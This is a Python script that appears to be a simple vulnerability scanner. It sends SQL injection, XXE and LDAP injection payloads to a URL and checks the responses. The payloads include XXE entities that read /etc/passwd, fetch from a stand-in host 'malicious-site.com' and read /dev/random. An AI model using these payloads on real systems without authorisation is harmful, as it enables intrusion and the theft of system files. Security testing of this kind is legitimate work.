import requests
import re

def is_sql_injection_vulnerable(url):
    sql_payloads = ["' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(5)--"]
    for payload in sql_payloads:
        try:
            response = requests.get(url + "?id=" + payload)
            if response.status_code == 200 and (
                re.search(r"error|warning", response.text, re.IGNORECASE) or "sleep" in response.text
            ):
                return True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    
    return False

def is_xxe_vulnerable(url):
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "http://malicious-site.com/malicious.xml" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///dev/random" >] >
        <foo>&xxe;</foo>"""
    ]
    
    headers = {'Content-Type': 'application/xml'}
    vulnerable = False
    for payload in payloads:
        response = requests.post(url, data=payload, headers=headers)
        if "root" in response.text or "passwd" in response.text or "error" in response.text:
            print("XXE payload worked.")
            vulnerable = True
    return vulnerable

def is_ldap_injection_vulnerable(url):
    payloads = [
        "(uid=*))(|(uid=*))", "(uid=admin)(&(password=*))", "(&(uid=*))", "(cn=*))(|(cn=*))", "(|(uid=*))"
    ]
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(url + "?input=" + payload)
            if response.status_code == 200 and "error" in response.text:
                print(f"LDAP Injection payload '{payload}' worked.")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    return vulnerable